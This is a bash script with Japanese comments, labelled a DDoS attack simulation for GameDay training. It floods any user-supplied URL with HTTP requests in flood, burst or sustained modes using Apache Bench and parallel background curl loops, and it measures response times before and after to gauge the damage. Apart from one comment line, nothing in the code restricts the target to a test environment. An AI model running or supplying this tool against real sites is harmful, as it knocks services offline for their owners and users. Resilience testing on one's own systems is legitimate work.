#!/bin/bash

# DDoS攻撃シミュレーションスクリプト
# GameDay環境での学習目的のみに使用

set -e

# デフォルト値
DEFAULT_TARGET_URL=""
DEFAULT_CONCURRENT_REQUESTS=50
DEFAULT_DURATION=30
DEFAULT_REQUEST_COUNT=1000

# 使用方法を表示
show_usage() {
    echo "使用方法: $0 [オプション]"
    echo ""
    echo "オプション:"
    echo "  -u, --url URL              ターゲットURL (必須)"
    echo "  -c, --concurrent NUM       同時リクエスト数 (デフォルト: $DEFAULT_CONCURRENT_REQUESTS)"
    echo "  -d, --duration SEC         攻撃持続時間（秒） (デフォルト: $DEFAULT_DURATION)"
    echo "  -n, --requests NUM         総リクエスト数 (デフォルト: $DEFAULT_REQUEST_COUNT)"
    echo "  -t, --type TYPE            攻撃タイプ (flood|burst|sustained) (デフォルト: flood)"
    echo "  -h, --help                 このヘルプを表示"
    echo ""
    echo "例:"
    echo "  $0 -u http://example.com -c 100 -d 60"
    echo "  $0 --url http://example.com --type burst --concurrent 200"
    exit 1
}

# パラメータ解析
TARGET_URL=""
CONCURRENT_REQUESTS=$DEFAULT_CONCURRENT_REQUESTS
DURATION=$DEFAULT_DURATION
REQUEST_COUNT=$DEFAULT_REQUEST_COUNT
ATTACK_TYPE="flood"

while [[ $# -gt 0 ]]; do
    case $1 in
        -u|--url)
            TARGET_URL="$2"
            shift 2
            ;;
        -c|--concurrent)
            CONCURRENT_REQUESTS="$2"
            shift 2
            ;;
        -d|--duration)
            DURATION="$2"
            shift 2
            ;;
        -n|--requests)
            REQUEST_COUNT="$2"
            shift 2
            ;;
        -t|--type)
            ATTACK_TYPE="$2"
            shift 2
            ;;
        -h|--help)
            show_usage
            ;;
        *)
            echo "不明なオプション: $1"
            show_usage
            ;;
    esac
done

# 必須パラメータチェック
if [[ -z "$TARGET_URL" ]]; then
    echo "エラー: ターゲットURLが指定されていません"
    show_usage
fi

# 数値パラメータの検証
if ! [[ "$CONCURRENT_REQUESTS" =~ ^[0-9]+$ ]] || [[ "$CONCURRENT_REQUESTS" -lt 1 ]]; then
    echo "エラー: 同時リクエスト数は正の整数である必要があります"
    exit 1
fi

if ! [[ "$DURATION" =~ ^[0-9]+$ ]] || [[ "$DURATION" -lt 1 ]]; then
    echo "エラー: 持続時間は正の整数である必要があります"
    exit 1
fi

if ! [[ "$REQUEST_COUNT" =~ ^[0-9]+$ ]] || [[ "$REQUEST_COUNT" -lt 1 ]]; then
    echo "エラー: リクエスト数は正の整数である必要があります"
    exit 1
fi

# 攻撃タイプの検証
case $ATTACK_TYPE in
    flood|burst|sustained)
        ;;
    *)
        echo "エラー: 無効な攻撃タイプ: $ATTACK_TYPE"
        echo "有効なタイプ: flood, burst, sustained"
        exit 1
        ;;
esac

# 必要なツールの確認
check_tools() {
    local missing_tools=()
    
    if ! command -v curl &> /dev/null; then
        missing_tools+=("curl")
    fi
    
    if ! command -v ab &> /dev/null; then
        missing_tools+=("apache2-utils (ab)")
    fi
    
    if [[ ${#missing_tools[@]} -gt 0 ]]; then
        echo "エラー: 以下のツールがインストールされていません:"
        printf '%s\n' "${missing_tools[@]}"
        echo ""
        echo "インストール方法:"
        echo "  Ubuntu/Debian: sudo apt-get install curl apache2-utils"
        echo "  CentOS/RHEL: sudo yum install curl httpd-tools"
        echo "  macOS: brew install curl httpd"
        exit 1
    fi
}

# ログファイルの設定
LOG_DIR="./logs"
mkdir -p "$LOG_DIR"
LOG_FILE="$LOG_DIR/ddos_simulation_$(date +%Y%m%d_%H%M%S).log"

# ログ関数
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# 攻撃前のベースライン測定
measure_baseline() {
    log "ベースライン測定を開始..."
    
    local response_time
    response_time=$(curl -o /dev/null -s -w "%{time_total}" "$TARGET_URL" 2>/dev/null || echo "timeout")
    
    if [[ "$response_time" == "timeout" ]]; then
        log "警告: ベースライン測定でタイムアウトが発生しました"
        return 1
    else
        log "ベースライン応答時間: ${response_time}秒"
        return 0
    fi
}

# HTTP Flood攻撃
http_flood_attack() {
    log "HTTP Flood攻撃を開始..."
    log "ターゲット: $TARGET_URL"
    log "同時リクエスト数: $CONCURRENT_REQUESTS"
    log "総リクエスト数: $REQUEST_COUNT"
    
    # Apache Benchを使用した攻撃
    ab -n "$REQUEST_COUNT" -c "$CONCURRENT_REQUESTS" -l "$TARGET_URL" 2>&1 | tee -a "$LOG_FILE"
}

# Burst攻撃（短時間で大量のリクエスト）
burst_attack() {
    log "Burst攻撃を開始..."
    log "ターゲット: $TARGET_URL"
    log "同時リクエスト数: $CONCURRENT_REQUESTS"
    log "持続時間: ${DURATION}秒"
    
    local end_time=$(($(date +%s) + DURATION))
    local request_count=0
    
    while [[ $(date +%s) -lt $end_time ]]; do
        for ((i=1; i<=CONCURRENT_REQUESTS; i++)); do
            curl -s -o /dev/null "$TARGET_URL" &
            ((request_count++))
        done
        sleep 0.1  # 短い間隔
    done
    
    wait  # 全てのバックグラウンドプロセスの完了を待機
    log "Burst攻撃完了: 総リクエスト数 $request_count"
}

# Sustained攻撃（持続的な攻撃）
sustained_attack() {
    log "Sustained攻撃を開始..."
    log "ターゲット: $TARGET_URL"
    log "同時リクエスト数: $CONCURRENT_REQUESTS"
    log "持続時間: ${DURATION}秒"
    
    local end_time=$(($(date +%s) + DURATION))
    local request_count=0
    
    while [[ $(date +%s) -lt $end_time ]]; do
        for ((i=1; i<=CONCURRENT_REQUESTS; i++)); do
            curl -s -o /dev/null "$TARGET_URL" &
            ((request_count++))
        done
        sleep 1  # 1秒間隔
    done
    
    wait  # 全てのバックグラウンドプロセスの完了を待機
    log "Sustained攻撃完了: 総リクエスト数 $request_count"
}

# 攻撃後の影響測定
measure_impact() {
    log "攻撃後の影響測定を開始..."
    
    local attempts=5
    local successful_requests=0
    local total_response_time=0
    
    for ((i=1; i<=attempts; i++)); do
        local response_time
        response_time=$(curl -o /dev/null -s -w "%{time_total}" "$TARGET_URL" 2>/dev/null || echo "timeout")
        
        if [[ "$response_time" != "timeout" ]]; then
            ((successful_requests++))
            total_response_time=$(echo "$total_response_time + $response_time" | bc -l 2>/dev/null || echo "$total_response_time")
        fi
        
        sleep 2
    done
    
    if [[ $successful_requests -gt 0 ]]; then
        local avg_response_time
        avg_response_time=$(echo "scale=3; $total_response_time / $successful_requests" | bc -l 2>/dev/null || echo "計算不可")
        log "攻撃後の平均応答時間: ${avg_response_time}秒 (成功: $successful_requests/$attempts)"
    else
        log "攻撃後: 全てのリクエストが失敗しました"
    fi
}

# メイン実行
main() {
    log "=== DDoS攻撃シミュレーション開始 ==="
    log "攻撃タイプ: $ATTACK_TYPE"
    
    # 必要なツールの確認
    check_tools
    
    # ベースライン測定
    if ! measure_baseline; then
        log "警告: ベースライン測定に失敗しましたが、攻撃を続行します"
    fi
    
    # 攻撃実行
    case $ATTACK_TYPE in
        flood)
            http_flood_attack
            ;;
        burst)
            burst_attack
            ;;
        sustained)
            sustained_attack
            ;;
    esac
    
    # 攻撃後の影響測定
    sleep 5  # 少し待機してから測定
    measure_impact
    
    log "=== DDoS攻撃シミュレーション完了 ==="
    log "ログファイル: $LOG_FILE"
}

# スクリプト実行
main "$@"